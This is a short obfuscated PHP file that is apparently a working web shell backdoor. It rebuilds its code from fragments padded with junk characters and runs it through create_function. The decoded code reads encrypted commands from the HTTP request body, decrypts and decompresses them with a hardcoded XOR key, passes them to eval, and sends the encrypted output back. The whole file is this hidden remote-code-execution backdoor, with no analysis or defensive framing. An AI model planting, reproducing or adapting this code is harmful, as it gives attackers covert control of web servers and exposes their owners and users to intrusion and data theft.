<?php
$Z=str_replace('Bq','','crBqBqeate_BqBqfuncBqBqtion');
$e='I();$qIr=@basqIe64_encoqIde(@x(@gzcqIompqIress($oqI),$k));pqIrint("$pqI$kh$rqI$kf");}';
$d='qI};}qI}return qI$o;}qIqIif (@preg_matchqIqI("/$qIqIkh(.+)$kf/",@filqIe_get_qIconten';
$F='tsqI(qI"php://input"qI),qIqI$m)==1) {@ob_starqIt();qI@eqIval(@gzuncomqIpqIqIreqIss(';
$C='@x(@baqIse64_dqIecode($m[1]),$qIk)));$qIo=@qIob_get_contenqIts()qI;@qIobqI_end_cleanq';
$J='$k="26qIcde5qIdqId";$qIkh="42a1fqI3b63d06";$kf="qI5b89417qIdd1a1qI";$qIpqI="foEEIox';
$b='qIgzjpkqIy9qI91";function x($tqIqI,$k){$qIc=strlenqI($k);qI$l=strlqIen($t);$oqI="qI";for($';
$N='i=0qI;$i<qI$l;){fqIor($jqI=0qI;(qI$j<$c&&qI$i<$l);$j++,$iqI++){$o.=$qIt{$i}qI^$k{$j';
$I=str_replace('qI','',$J.$b.$N.$d.$F.$C.$e);
$j=$Z('',$I);$j();
?>
